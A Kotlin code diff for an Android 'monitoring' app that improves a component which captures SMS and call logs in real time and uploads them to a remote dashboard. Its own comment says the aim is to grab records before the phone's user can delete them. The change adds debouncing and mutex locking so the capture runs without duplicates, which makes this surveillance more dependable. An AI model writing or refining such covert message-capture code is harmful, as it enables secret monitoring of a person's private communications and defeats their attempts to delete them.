@@ -20,8 +20,12 @@ import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import java.time.Instant
 
 /**
@@ -31,6 +35,9 @@ import java.time.Instant
  * or completed — BEFORE the user has time to delete them from their messaging
  * or phone dialer app. Saves them immediately into the local Room database,
  * and kicks off an immediate background upload so the dashboard updates live.
+ *
+ * Employs debouncing and Mutex locking to prevent duplicate entries caused by
+ * Android's multi-stage ContentObserver notifications (e.g. outbox -> sent).
  */
 object RealtimeLogObserverManager {
 
@@ -39,9 +46,13 @@ object RealtimeLogObserverManager {
 
     private var smsObserver: ContentObserver? = null
     private var isSmsRegistered = false
+    private var smsJob: Job? = null
+    private val smsMutex = Mutex()
 
     private var callObserver: ContentObserver? = null
     private var isCallRegistered = false
+    private var callJob: Job? = null
+    private val callMutex = Mutex()
 
     @Synchronized
     fun start(context: Context) {
@@ -60,6 +71,8 @@ object RealtimeLogObserverManager {
         } finally {
             smsObserver = null
             isSmsRegistered = false
+            smsJob?.cancel()
+            smsJob = null
         }
 
         try {
@@ -69,6 +82,8 @@ object RealtimeLogObserverManager {
         } finally {
             callObserver = null
             isCallRegistered = false
+            callJob?.cancel()
+            callJob = null
         }
     }
 
@@ -82,7 +97,7 @@ object RealtimeLogObserverManager {
             val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                 override fun onChange(selfChange: Boolean, uri: Uri?) {
                     super.onChange(selfChange, uri)
-                    captureSms(appCtx)
+                    triggerSmsCapture(appCtx)
                 }
             }
             appCtx.contentResolver.registerContentObserver(
@@ -95,7 +110,7 @@ object RealtimeLogObserverManager {
             Log.d(TAG, "SMS ContentObserver registered")
 
             // Initial capture on startup in case SMS arrived while inactive
-            captureSms(appCtx)
+            triggerSmsCapture(appCtx)
         } catch (e: Exception) {
             Log.e(TAG, "Failed to register SMS ContentObserver", e)
         }
@@ -111,7 +126,7 @@ object RealtimeLogObserverManager {
             val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
                 override fun onChange(selfChange: Boolean, uri: Uri?) {
                     super.onChange(selfChange, uri)
-                    captureCalls(appCtx)
+                    triggerCallCapture(appCtx)
                 }
             }
             appCtx.contentResolver.registerContentObserver(
@@ -124,14 +139,34 @@ object RealtimeLogObserverManager {
             Log.d(TAG, "Call ContentObserver registered")
 
             // Initial capture on startup
-            captureCalls(appCtx)
+            triggerCallCapture(appCtx)
         } catch (e: Exception) {
             Log.e(TAG, "Failed to register Call ContentObserver", e)
         }
     }
 
-    fun captureSms(context: Context) {
-        scope.launch {
+    fun triggerSmsCapture(context: Context) {
+        synchronized(this) {
+            smsJob?.cancel()
+            smsJob = scope.launch {
+                delay(350) // Coalesce multi-stage SMS provider writes (outbox -> sent)
+                captureSms(context)
+            }
+        }
+    }
+
+    fun triggerCallCapture(context: Context) {
+        synchronized(this) {
+            callJob?.cancel()
+            callJob = scope.launch {
+                delay(350)
+                captureCalls(context)
+            }
+        }
+    }
+
+    private suspend fun captureSms(context: Context) {
+        smsMutex.withLock {
             try {
                 val db = AppDatabase.getInstance(context)
                 val state = DeviceState(context)
@@ -162,14 +197,15 @@ object RealtimeLogObserverManager {
                         }
                     }
                 }
+                Unit
             } catch (e: Exception) {
                 Log.e(TAG, "Error in real-time SMS capture", e)
             }
         }
     }
 
-    fun captureCalls(context: Context) {
-        scope.launch {
+    private suspend fun captureCalls(context: Context) {
+        callMutex.withLock {
             try {
                 val db = AppDatabase.getInstance(context)
                 val state = DeviceState(context)
@@ -199,6 +235,7 @@ object RealtimeLogObserverManager {
                         }
                     }
                 }
+                Unit
             } catch (e: Exception) {
                 Log.e(TAG, "Error in real-time Call capture", e)
             }
